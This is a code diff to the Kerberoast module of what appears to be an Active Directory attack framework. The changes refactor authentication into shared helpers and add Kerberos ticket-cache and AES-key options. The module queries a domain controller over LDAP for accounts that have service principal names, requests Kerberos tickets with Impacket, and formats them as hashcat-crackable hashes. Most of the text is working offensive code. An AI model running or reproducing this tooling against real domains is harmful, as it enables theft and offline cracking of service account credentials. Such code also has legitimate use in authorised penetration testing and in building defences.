@@ -7,7 +7,9 @@ from typing import Any
 
 from rich.console import Console
 
+from adaf_attack.core.auth import describe_auth, get_kerberos_tgt
 from adaf_attack.core.graph import AttackGraph
+from adaf_attack.core.ldap_util import ldap_connect
 from adaf_attack.core.redaction import redact
 from adaf_attack.core.registry import register_capability
 from adaf_attack.core.roast_format import format_tgs_hashcat
@@ -36,36 +38,27 @@ class Kerberoast:
     ) -> dict[str, Any]:
         try:
             from impacket.krb5 import constants
-            from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
+            from impacket.krb5.kerberosv5 import getKerberosTGS
             from impacket.krb5.types import Principal
         except ImportError as exc:
             raise RuntimeError(
                 "Kerberoasting requires Impacket. Install with: pip install 'adaf-attack[kerberos]'"
             ) from exc
 
-        if not target.username or not (target.password or target.hashes):
-            raise RuntimeError("Kerberoasting requires credentials (username + password or hashes)")
+        if not target.has_credentials:
+            raise RuntimeError(
+                "Kerberoasting requires credentials "
+                "(--username + password/hashes/aes-key, or -k/--ccache)"
+            )
 
         console.print(f"[bold]Kerberoast[/bold] → {target.domain} @ {target.dc_ip}")
+        console.print(f"[dim]Auth: {describe_auth(target)}[/dim]")
 
-        from ldap3 import ALL, SUBTREE, Connection, Server
-
-        server = Server(target.dc_ip, get_info=ALL, use_ssl=target.ldaps)
-        conn = Connection(
-            server,
-            user=target.auth_user,
-            password=target.password or "",
-            authentication="NTLM",
-            auto_bind=True,
-        )
-        base_dn = server.info.other.get("defaultNamingContext", [None])[0]
-        if not base_dn:
-            base_dn = ",".join(f"DC={p}" for p in target.domain.split("."))
-
+        conn, base_dn, _config = ldap_connect(target)
         conn.search(
             base_dn,
             "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
-            search_scope=SUBTREE,
+            search_scope=__import__("ldap3").SUBTREE,
             attributes=["sAMAccountName", "servicePrincipalName", "userAccountControl"],
         )
 
@@ -83,26 +76,7 @@ class Kerberoast:
         conn.unbind()
         console.print(f"Found [cyan]{len(targets)}[/cyan] SPN-enabled accounts")
 
-        lmhash = nthash = ""
-        if target.hashes:
-            parts = target.hashes.split(":")
-            if len(parts) == 2:
-                lmhash, nthash = parts
-            else:
-                nthash = parts[0]
-
-        user_principal = Principal(
-            target.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
-        )
-        tgt, cipher, _old, session_key = getKerberosTGT(
-            user_principal,
-            target.password or "",
-            target.domain.upper(),
-            lmhash,
-            nthash,
-            "",
-            target.dc_ip,
-        )
+        tgt, cipher, _old, session_key = get_kerberos_tgt(target)
 
         roasted = []
         hash_lines: list[str] = []
